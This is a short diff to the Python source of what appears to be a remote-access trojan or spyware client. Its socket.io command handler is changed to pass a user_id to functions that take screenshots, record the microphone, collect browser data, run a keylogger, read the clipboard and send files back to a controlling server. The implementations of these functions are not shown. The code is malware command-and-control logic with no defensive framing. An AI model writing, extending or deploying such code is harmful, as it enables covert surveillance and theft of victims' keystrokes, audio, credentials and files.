@@ -34,6 +34,7 @@ def disconnect():
 @sio.event
 def command(data):
     command = data.get('command')
+    user_id = data.get('user_id')
     params = data.get('params', {})
     duration = 0
     file_path = ""
@@ -54,17 +55,17 @@ def command(data):
         duration = int(params)
 
     if command == 'screenshot':
-        take_and_send_screenshot(sio)
+        take_and_send_screenshot(sio, user_id)
     elif command == 'microphone':
-        record_and_send_audio(duration, sio)
+        record_and_send_audio(duration, sio, user_id)
     elif command == 'browserdata':
-        send_browser_data(sio)
+        send_browser_data(sio, user_id)
     elif command == 'keylogger':
-        record_and_send_keyboard_log(duration, sio)
+        record_and_send_keyboard_log(duration, sio, user_id)
     elif command == 'clipboard':
-        get_clipboard_content(sio)
+        get_clipboard_content(sio, user_id)
     elif command == 'downloadfile':
-        download_file(file_path, sio)
+        download_file(file_path, sio, user_id)
 
 
 @sio.event
